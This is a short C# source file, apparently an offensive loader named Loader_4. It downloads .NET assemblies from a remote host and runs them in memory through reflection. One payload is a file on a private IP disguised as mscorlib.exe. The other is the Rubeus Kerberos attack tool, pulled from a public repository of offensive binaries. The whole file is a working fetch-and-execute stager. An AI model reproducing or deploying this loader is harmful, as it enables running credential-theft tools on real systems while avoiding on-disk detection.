using System;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Loader_4
{
    internal class Program
    {
        public void fetchFromWeb(string url, int retry, int timeout)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient web = new WebClient();
            byte[] programBytes = null;

            while (retry > 0 && programBytes == null)
            {
                try
                {
                    programBytes = web.DownloadData(url);
                }
                catch (WebException ex)
                {
                    Console.WriteLine("Assembly couldn't be loaded from the URL. Sleeping for {0} seconds and retrying for {1} time(s).", timeout, retry);
                    retry--;
                    Thread.Sleep(timeout * 1000);
                }
            }

            if (programBytes == null)
            {
                Console.WriteLine("Assembly not found. Exiting the process...");
                Environment.Exit(-1);
            }

            var asm = Assembly.Load(programBytes);
            Object[] param = new String[] { null };
            asm.EntryPoint.Invoke(null, param);
        }
        static void Main(string[] args)
        {
            Program p = new Program();
            try
            {
                Console.WriteLine("Press any key to start.");
                Console.ReadKey();
                p.fetchFromWeb("http://192.168.43.90/mscorlib.exe", 3, 5);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Console.WriteLine("Could not load mscorlib. Exiting the process...");
                Environment.Exit(-1);
            }
            try
            {
                p.fetchFromWeb("https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_Any/Rubeus.exe", 3, 5);
                Console.ReadKey();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadKey();
            }
        }
    }
}
